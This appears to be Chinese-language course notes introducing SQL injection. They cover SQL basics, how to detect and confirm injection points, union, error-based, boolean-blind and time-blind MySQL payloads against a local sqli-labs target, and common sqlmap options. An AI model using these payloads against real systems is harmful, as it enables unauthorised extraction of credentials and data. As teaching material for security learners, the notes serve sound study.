# 入门 SQL 注入

## 01 SQL 注入概述

### 0101 SQL 语言介绍

#### **SQL 语句分为六类**

- 数据查询语言 DQL：SELECT / WHERE / ORDER BY / GROUP BY / HAVING
- 数据操作语言 DML：INSERT / UPDATE / DELETE
- 数据控制语言 DCL：GRANT / REVOKE
- 数据定义语言 DDL：CREATE / ALERT / DROP
- 事务控制语言 TCL： COMMIT / SAVEPOINT / ROLLBACK
- 指针控制语言 CCL： DECLARE CURSOR / FETCH INTO / UPDATE WHERE CURREN

#### **SQL 常用操作示例**

- `CREATE DATABASE database_name;` # 创建数据库
- `DROP DATABASE database_name;` # 删除数据库
- `CREATE TABLE table_name (column1 type, column2 type, …);` # 创建表
- `DROP TABLE table_name;` # 删除表
- `SELECT column1, column2, … FROM table_name;` # 查询表中指定列
- `SELECT column1, column2, … FROM table_name WHERE condition;` # 添加查询条件
- `SELECT column1, column2, … FROM table_name WHERE condition1 AND|OR condition2;` # 添加多个查询条件
- `SELECT column1, column2, … FROM table_name ORDER BY column1, column2, … ASC|DESC;` # 查询表中数据并对结果排序
- `SELECT column FROM table1 UNION SELECT column FROM table2;` # 查询多个表，其中各个表查询的列数要相同
- `SELECT CASE WHEN condition THEN result1 ELSE result2 END;` # 类似 if 语句的查询方法
- `INSERT INTO table_name (column1, column2, …) VALUES (value1, value2, …);` # 向表中插入数据
- `UPDATE table_name SET column1=value1, column2=value2, … WHERE condition;` # 更新表中满足条件的数据
- `DELETE FROM table_name WHERE condition;` # 删除表中满足条件的数据

### 0102 SQL 注入原理

客户端 → 脚本引擎 → 数据库 → 脚本引擎 → 客户端

攻击者在向应用程序提交输入时，通过构造恶意SQL语句，最终改变应用开发者定义的SQL查询语句的语法和功能

`select * from users where username='admin' or '1'='1' and password='1';` # and的优先级比or高
`select * from users where username='admin' or 1=1#' and password='1';` # 井号注释后面的语句

## 02 SQL 注入检测方法

### 0201 寻找 SQL 注入

#### **SQL 注入可分为三步**

1. 识别WEB应用与数据库交互的可能输入
    1. GET 参数
    2. POST 参数
    3. Cookie
    4. X-Forwarded-For
    5. User-Agent
    6. Referer
    7. Host
2. SQL 注入语句测试
3. 根据服务器返回判别注入语句是否影响了 SQL 执行结果以判断是否存在 SQL 注入

#### **SQL 注入按照注入参数类型分为两类**

**（两类的区别在于是否使用单引号闭合）**

1. 数字型注入
    1. [http://test.com/shownews.php?id=](http://test.com/shownews.php?id=1)1
    2. `SELECT * FROM news WHERE news_id=1;`
2. 字符型注入
    1. http://test.com/show.php?name=apple
    2. `SELECT * FROM fruits WHERE name='apple';`
    

#### **各种数据库的字符串连接方式**

- Oracle： `'||'`
- DB2： `'||'`
- SQL Server： `'+'`
- MySQL： `' '`

### 0202 确认 SQL 注入

#### **确认数据库类型的方式**

- 基于应用开发语言判断
    - Oracle：JAVA
    - DB2：JAVA
    - SQL Server：C# / ASP / .NET
    - MySQL：PHP / JAVA
- 基于报错信息判断
    - Oracle： `### Error querying database. Cause:java.sql.SQLSyntaxErrorException: ORA-01756: quoted string not properly terminated` （关键字：ORA）
    - SQL Server：`Microsoft OLE DB Provider for SQL Server 错误 ‘80040e14` （关键字：SQL Server）
    - MySQL：`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near “1” LIMIT 0,1’ at line 1` （关键字：MySQL）
- 基于特有函数 / 语句判断
    
    ![Untitled](Week1%20SQL%20%E6%B3%A8%E5%85%A5%20e4180dff4f7848cfbd5721d8fa0fd301/Untitled.png)
    
- 基于特有数据表判断
    - Oracle：`and (select count(*) from sys.user_tables)>0`
    - DB2：`and (select count(*) from sysibm.systables)>0`
    - SQL Server：`and (select count(*) from sysobjects)>0`
    - MySQL：`and (select count(*) from information_schema.tables)>0`

#### **SQL 注入按照注入方式分为两类**

- 显示注入
    - `union query` # 联合查询注入，通过union联合查询获取查询结果
    - `error based` # 报错注入，通过报错信息获取查询结果
- 盲注
    - `boolean based blind` # 布尔盲注，通过应用返回不同的值推断条件真假
    - `time based blind` # 时间盲注，通过不同的时间延迟推断条件真假

效率优先级：`union query` ≥ `error based` > `boolean base blind` > `time based blind`

#### **union query**

提前：页面可以显示数据库查询结果

- `id=1 ORDER BY 5` #猜测字段数
- `id=-1 UNION SELECT 1,2,3,4,5` #测试哪个字段有回显
- `id=-1 UNION SELECT 1, concat(user(), 0x2b, database()), 3, 4` #获取数据库用户和数据库名
- `id=-1 UNION SELECT 1, group_concat(distinct table_name), 3, 4 FROM information_schema.tables WHERE table_schema=database()` #获取表名
- `id=-1 UNION SELECT 1, group_concat(distinct column_name), 3, 4 FROM information_schema.columns WHERE table_name='user'` # 获取列名
- `id=-1 UNION SELECT 1, concat(id, 0x2b, name, 0x2b, password), 3, 4 FROM user` #获取具体数据

sqli-labs 靶场练习：

- [`http://192.168.10.10:8081/Less-1/?id=1](http://192.168.10.10:8081/Less-1/?id=1)' ORDER BY 3%23` #判断字段数
- [`http://192.168.10.10:8081/Less-1/?id=1](http://192.168.10.10:8081/Less-1/?id=1)' AND 1=2 UNION SELECT 1,2,3%23` # 测试哪个字段有回显
- [`http://192.168.10.10:8081/Less-1/?id=1](http://192.168.10.10:8081/Less-1/?id=1)' AND 1=2 UNION SELECT 1,2, concat(user(), 0x2b, database())%23` #获取数据库用户和数据库名
- [`http://192.168.10.10:8081/Less-1/?id=1](http://192.168.10.10:8081/Less-1/?id=1)' AND 1=2 UNION SELECT 1,2, group_concat(DISTINCT table_name) FROM information_schema.tables WHERE table_schema=database()%23` #获取表名
- [`http://192.168.10.10:8081/Less-1/?id=1](http://192.168.10.10:8081/Less-1/?id=1)' AND 1=2 UNION SELECT 1,2, group_concat(DISTINCT column_name) FROM information_schema.columns WHERE table_name='users'%23` # 获取列名
- [`http://192.168.10.10:8081/Less-1/?id=1](http://192.168.10.10:8081/Less-1/?id=1)' AND 1=2 UNION SELECT 1,2,concat(id, 0x2b, username, 0x2b, password) FROM users WHERE id=5%23` #获取具体数据

#### **error based**

前提：应用可以输出数据库报错信息

- `AND (SELECT 1 FROM (SELECT count(*), concat(version(), floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)`
- `AND 1=(updatexml(1, concat(0x3a, (SELECT user())), 1))`
- `AND extractvalue(1, concat(0x5c, (SELECT user())))`
- `AND exp(~(SELECT * FROM (SELECT user())a))`

#### **boolean based blind**

前提：条件真假页面有差别，可区分。可根据返回页面不同判断条件真假

需要一位一位字符猜解，常用的函数 `substr` / `ascii` / `mid` 

- `if (substr(flag, 1, 1) in (0x66), 3, 0)`
- `SELECT CASE WHEN ascii(mid((SELECT flag FROM flag), 1, 1))=65 THEN ‘A’ ELSE ‘B’ END`
- `CASE WHEN 1=1 THEN 1 ELSE 1/0 END`
- `SELECT user FROM user WHERE user=(SELECT CASE WHEN ascii(mid((SELECT pass FROM user LIMIT 0, 1), 1, 1))>0 THEN ‘admin’ ELSE ‘ ‘ END);`

#### **time based blind**

前提：在其他注入方式使用不了的情况下才会考虑时间盲注，需要借助时间延迟函数或其他方式达到时延的效果来判断条件真假

- `if(substr(flag, 1, 1) in (0x66), sleep(2), 0)`
- `SELECT CASE WHEN ascii(mid((SELECT flag FROM flag), 1, 1))=65 THEN benchmark(100000, sha1('1 ')) else '' END`
- `SELECT user FROM user WHERE id=1 AND if(substr(pass, 1, 1)in(0x70),sleep(2), 0);`

## 03 SQL 注入工具使用

### 0301 sqlmap 使用介绍

sqlmap 是一款自动化进行SQL注入的强大利器， [https://sqlmap.org](https://sqlmap.org)

#### **sqlmap 常用参数**

- `--users` #列出所有用户
- `—current-user` #列出当前用户
- `—is-dba` #查看当前用户是否为数据库管理员
- `—dbs` #列出所有数据库
- `—current-db` #查看当前数据库
- `-D "数据库名" —tables` #查表名
- `-D "数据库名" -T "表名" —columns` #查列名
- `-D "数据库名“ -T "表名" -C "列名" —dump` #查列名
- `—data "POST 数据"` #POST请求注入
- `-r r.txt` #将整个请求数据包保存为r.txt进行注入